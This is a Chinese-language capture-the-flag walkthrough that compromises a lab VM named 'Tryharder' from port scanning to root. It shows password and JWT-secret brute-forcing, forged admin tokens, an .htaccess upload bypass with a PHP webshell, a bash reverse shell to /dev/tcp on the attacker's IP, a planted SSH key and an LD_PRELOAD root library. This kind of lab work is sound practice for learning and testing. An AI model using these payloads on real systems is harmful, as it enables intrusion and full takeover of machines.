# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 工具扫描局域网内的存活主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.138 08:00:27:3E:2A:58       PCS Systemtechnik GmbH
...
```

**发现目标主机：** `192.168.205.138`

## 1.2 端口扫描

对目标主机进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.138
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

**开放端口：**

- 22/tcp - SSH服务
- 80/tcp - HTTP服务

## 1.3 UDP端口扫描

扫描常用UDP端口，未发现有价值信息：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -sU --top-ports 100 192.168.205.138
...
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
...
```

---

# 二、Web渗透

## 2.1 初步信息收集

访问 `http://192.168.205.138`，发现一个"西溪湖科技"公司页面，页面功能主要为锚点跳转。

查看页面源码时发现隐藏的注释信息：

```html
/* 调试信息：API路径 /NzQyMjE= */
```

## 2.2 Base64解码

识别到 `NzQyMjE=` 为Base64编码，进行解码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'NzQyMjE=' | base64 -d
74221
```

访问解码后的路径 `http://192.168.205.138/74221/`，发现一个登录页面。

## 2.3 目录扫描

使用 `gobuster` 对该目录进行扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.138/74221/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
...
/index.php            (Status: 200) [Size: 2174]
/uploads              (Status: 301) [--> http://192.168.205.138/74221/uploads/]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
...
```

**发现目录：**

- `/uploads` - 文件上传目录（存在999子目录，疑似用户ID）
- `/dashboard.php` - 仪表板页面（需要认证）

## 2.4 弱密码爆破

基于页面中的关键词 `Xiixhu`，构造用户名字典进行密码爆破：

**用户名字典：**

```
admin
test
guest
user
Xiixhu
```

使用Burp Suite进行爆破，成功获得凭证：

**凭证：** `test:123456`

---

# 三、JWT令牌伪造

## 3.1 JWT分析

登录后抓包发现使用JWT进行身份认证：

```
Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MTM5NDc5MH0.tGdne-jmzu_HPTgoT30sF4SKhN0mD9ogRep0z8pUjnw
```

解码JWT载荷发现：

```json
{
  "sub": "123",
  "role": "user",
  "exp": 1761394790
}
```

当前角色为 `user`，需要提升至 `admin` 才能获得文件上传权限。

## 3.2 JWT密钥爆破

使用 `jwt_tool` 进行密钥爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/jwt_tool]
└─$ python3 jwt_tool.py -C -d /usr/share/wordlists/seclists/Passwords/scraped-JWT-secrets.txt 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
...
[+] jwtsecret123 is the CORRECT key!
...
```

**成功爆破密钥：** `jwtsecret123`

## 3.3 伪造管理员令牌

使用在线JWT工具（如 jwt.io）或命令行工具，将 `role` 修改为 `admin`，并且`sub`改成`999`：

**伪造的JWT：**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjEzOTQ3OTB9.[签名部分]
```

将伪造的JWT替换到Cookie中，成功获得管理员权限。

---

# 四、文件上传GetShell

## 4.1 上传限制绕过

尝试上传PHP文件时提示只允许 `jpg` 和 `png` 格式。测试多种绕过方式：

- **双扩展名（php.jpg）**：可上传但不解析
- **.htaccess配合**：成功绕过

### 绕过步骤

**步骤1：上传 .htaccess 文件**

创建 `.htaccess` 文件，内容如下：

```apache
<IfModule mime_module>
    SetHandler application/x-httpd-php 
</IfModule>
```

该配置使当前目录下所有文件都被当作PHP执行。

**步骤2：上传PHP Webshell**

上传 `cmd.php`：

```php
<?php
system($_GET['cmd']);
?>
```

## 4.2 反弹Shell

访问上传的webshell：

```
http://192.168.205.138/74221/uploads/999/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.205.128/4444 0>&1'
```

本地监听端口：

```bash
nc -lvnp 4444
```

成功获得 `www-data` 权限的Shell。

## 4.3 Shell稳定化

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

---

# 五、权限提升

## 5.1 信息收集

### 发现隐藏端口

```bash
www-data@Tryharder:/home$ ss -tnlp
...
LISTEN  0  5  127.0.0.1:8989  0.0.0.0:*
...
```

发现本地8989端口开放服务。

### 发现关键文件

在 `/srv` 目录下发现两个可疑文件：

```bash
www-data@Tryharder:/srv$ ls -al
...
-rw-r--r--  1 root root  161 Mar 23  2025 ...
-rwx------  1 xiix xiix 1012 Mar 23  2025 backdoor.py
```

### 发现密码提示

在 `/home/pentester/.note` 中发现提示：

```
Two cities clashed in tale: Smash Caesar, buddy, to pass.
```

提示涉及**双城记（A Tale of Two Cities）**和**凯撒密码**。

## 5.2 密码解密

### 收集密文

从多个位置收集到两段相似文本：

**明文（来自passwd文件的GECOS字段）：**

```
Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...
```

**密文（来自/srv/...文件）：**

```
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```

### 隐写解密思路

对比两段文本，相同字符记为 `0`，不同字符记为 `1`，得到二进制序列，每8位转换为ASCII字符：

```python
text1 = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."
text2 = "Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"

binary = ""
for i in range(min(len(text1), len(text2))):
    if text1[i] == text2[i]:
        binary += "0"
    else:
        binary += "1"

result = ""
for i in range(0, len(binary), 8):
    byte = binary[i:i+8]
    if len(byte) == 8:
        result += chr(int(byte, 2))

print(f"{result}")
```

**输出结果：** `Y0U_5M4SH3D_17_8UDDY`

## 5.3 横向移动至pentester用户

使用解密得到的密码：

```bash
www-data@Tryharder:/home$ su pentester
Password: Y0U_5M4SH3D_17_8UDDY
pentester@Tryharder:/home$ id
uid=1000(pentester) gid=1000(pentester) groups=1000(pentester)
```

### 检查sudo权限

```bash
pentester@Tryharder:/home$ sudo -l
...
User pentester may run the following commands on tryharder:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

### find命令被篡改

尝试常规的sudo提权方式失败：

```bash
pentester@Tryharder:/home$ sudo find . -exec /bin/bash \; -quit
find: critical error - Segmentation fault (core dumped)
```

经检查，`/usr/bin/find` 已被替换为自定义的安全版本，禁用了 `exec`、`ok`、`print`、`fls` 等危险参数（但是他竟然没ban `delete `，打不进去就毁灭模式😊 ）。

**提权路径暂时受阻，转向其他方向。**

## 5.4 横向移动至xiix用户

### 测试8989端口服务

```bash
pentester@Tryharder:/tmp$ busybox nc 127.0.0.1 8989
Enter password: Y0U_5M4SH3D_17_8UDDY
Access granted!
shell> id
uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)
```

**成功访问！**密码为之前解密得到的 `Y0U_5M4SH3D_17_8UDDY`，获得了一个受限shell环境。

### 写入SSH公钥

在受限shell中创建SSH目录并写入公钥：

```bash
shell> cd
shell> mkdir .ssh
shell> cd .ssh
shell> echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtNESRfORlUdKO8kWioi3avqR24y4ASUNKAdR2HKASWJQJFzs3nVZbsJjFdxMVSNsOQUZFBxf5PVNyyGOdk7ccN4uAtltAAD2U8HN5GgXxmqqQKptXj9c8aSthRLWpaW3YLIXaMIDzXiRtGtycWNseLjc375ZwL7CHaoa+ZMi/CyooEmdOVvHdTWvueEm7Uj00YRu7KXsB/8xqtP+DMC+c5Dw8xC+XFqTTTsMFsRvvMZ1CIbB+G1YTlWBM9k4MZw+pwBpKDqFMxY1lkfMXuflsRR+PJAqWwJaZ+SQe09ZRDjvjF3IIkYt2uOy1SW9UHHDtnTfODbQyjP2KmTf6FZszCXwq2KiEX79M18MeQsG7XCbCqaytuC3fq4iOWJs0KT5BilrzGWG4g5hIoIQS9omASpsca2WDV9/jhx07vcmN91UsSjqRCr0WH+mQyHz8JnJB66JtZF4MWwQYcl5O7GfdSZl1sQo6jKCMuQW75kNTNMmF6URSGWpOcpKDQd/fdK35PqEA3ibbM+F71B4hmlcTgZBH+u/k8xyDdi886+GyGoAzmDCabEMa7hyRVkkuIgs5ngg9RsvWOlGpLkay1T7q3JZ+3DMLX0sz6eGAwocTJF5D5VoLmp3fzaKdEDE9WBTLn0vXLT8qpzFmtrOvMNB3O25+JS0Liw3vY7YFHvErFQ== kali@kali' > /home/xiix/.ssh/authorized_keys
shell> exit
Goodbye!
```

### SSH登录xiix用户

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh xiix@192.168.205.138
...
xiix@Tryharder:~$ id
uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)
```

**成功获得xiix用户的完整shell！**

## 5.5 猜数字游戏分析

在xiix用户家目录发现一个二进制程序：

```bash
xiix@Tryharder:~$ ls -al
...
---x------ 1 xiix xiix 17584 Mar 25  2025 guess_game
...
```

### 程序功能

```bash
xiix@Tryharder:~$ ./guess_game
===== 终极运气挑战 / Ultimate Luck Challenge ====
规则很简单： 我心里有个数字（0-99），你有一次机会猜。
I have a number (0-99), you get one guess.
猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
Guess right, I'll give your reward; wrong? Hehe, face the consequences!
提示： 聪明人也许能找到捷径。
Hint: Smart ones might find a shortcut.
输入你的猜测（0-99） / Your guess (0-99): 50
哈哈，猜错了！ / Wrong guess!
秘密数字是 51。 / Secret number: 51
正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)
```

这是一个猜数字游戏，需要猜中0-99之间的随机数。根据提示"聪明人也许能找到捷径"，可以采用**暴力循环**的方式：

### 暴力破解

```bash
xiix@Tryharder:~$ while true; do echo 25 | ./guess_game; done
...
天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!
Pass: superxiix
...
```

**获得密码：** `superxiix`

## 5.6 LD_PRELOAD提权

### 检查sudo权限

```bash
xiix@Tryharder:~$ sudo -l
[sudo] password for xiix: superxiix
Matching Defaults entries for xiix on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User xiix may run the following commands on tryharder:
    (ALL : ALL) /bin/whoami
```

**关键配置：** `env_keep+=LD_PRELOAD`

这是一个典型的LD_PRELOAD提权场景。当sudo配置允许保留 `LD_PRELOAD` 环境变量时，可以通过预加载恶意共享库来劫持程序执行。

### LD_PRELOAD提权原理

`LD_PRELOAD` 是Linux动态链接器的一个环境变量，用于在程序运行前预加载指定的共享库。当共享库中定义了 `_init()` 函数时，该函数会在程序main函数之前自动执行。

### 编写恶意共享库

```c
xiix@Tryharder:/tmp$ cat a.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

**代码说明：**

- `unsetenv("LD_PRELOAD")`：清除环境变量，避免子进程继承

- `setresuid(0,0,0)`：设置真实、有效、保存的UID都为0（root）

- `system("/bin/bash -p")`：启动一个保留特权的bash shell

  ### 编译共享库

  ```bash
  xiix@Tryharder:/tmp$ gcc -fPIC -shared -nostartfiles -o /tmp/a.so a.c
  a.c: In function '_init':
  a.c:6:5: warning: implicit declaration of function 'setresuid' [-Wimplicit-function-declaration]
       setresuid(0,0,0);
       ^~~~~~~~~
  ```

  **编译参数说明：**

  - `-fPIC`：生成位置无关代码（Position Independent Code）
  - `-shared`：生成共享库
  - `-nostartfiles`：不链接标准启动文件，因为我们使用 `_init()` 作为入口点

  ### 执行提权

  ```bash
  xiix@Tryharder:/tmp$ sudo LD_PRELOAD=/tmp/a.so /bin/whoami
  root@Tryharder:/tmp# id
  uid=0(root) gid=0(root) groups=0(root)
  ```

  **提权成功！**获得root权限。

  ---

  # 六、获取Flag

  ```bash
  root@Tryharder:/tmp# cat /root/root.txt /home/pentester/user.txt
  Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}
  Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
  ```

  **成功获取所有Flag！**